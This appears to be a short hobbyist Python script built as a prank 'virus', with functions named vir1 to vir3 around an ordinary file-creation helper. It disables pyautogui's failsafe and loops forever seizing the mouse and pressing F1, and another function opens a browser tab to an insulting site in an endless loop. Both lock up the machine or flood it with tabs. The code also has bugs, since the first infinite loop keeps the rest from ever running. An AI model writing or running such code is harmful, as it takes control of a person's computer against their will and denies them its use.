from types import NoneType
import webbrowser
import pyautogui as gui
import time
import os

def vir1():
    screenWidth, screenHeight = gui.size()
    gui.FAILSAFE = False
    time.sleep(5)
    while True:
        gui.moveTo(screenWidth/2, screenHeight/2, 0)
        gui.press('f1')
ext = 'txt'

def vir2():
    global name 
    name = input('Enter file name: ')
    global content 
    content = 'Error in file handling request. Check syntax.'
    global path 
    path = '/Users/nassemnabil/Library/CloudStorage/OneDrive-Personal/Python file creator' 
    #path variable is separate from os.chdir function call else f-string returns None/name[0]/ext

    os.chdir('/Users/nassemnabil/Library/CloudStorage/OneDrive-Personal/Python file creator')
    name.strip()


    if '.' in name:
        name = name.partition('.')
        ext = name[2]
    else:
        ext = 'txt'
        #set file extension to txt if not specified in user input
    # try:
    file = open(f'{path}/{name[0]}.{ext}', 'x')
    file.close() #initialise file creation
    # except :
    with open(f'{path}/{name[0]}.{ext}', 'a') as file:
        while content != '':
            content = input('')
            file.write(content)
            file.write('\n') #User can keep adding lines, until a blank input is received. Loop stops and file closes.


def vir3():
    while True:
        webbrowser.open('https://youarestupid.cc')
        
def test_file_created():
    with open(f'{path}/{name[0]}.{ext}', 'r') as test:
        print(test.read()) #test input method by returning file read.

if __name__ == '__main__':
    vir1()
    vir2()
    vir3()